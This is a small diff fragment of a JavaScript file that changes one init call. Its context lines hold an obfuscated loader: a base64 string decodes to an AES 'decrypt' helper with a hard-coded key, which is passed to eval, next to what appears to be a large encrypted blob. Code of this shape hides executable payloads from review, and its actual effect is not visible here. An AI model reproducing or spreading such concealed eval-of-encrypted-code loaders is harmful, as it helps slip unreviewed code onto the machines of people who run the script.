@@ -264,7 +264,7 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
   var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
   ('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfQ==');
 
-  init("Tube",function(){})
+  init({init:"Tube"},function(){})
 }
 
 var mm = new main()
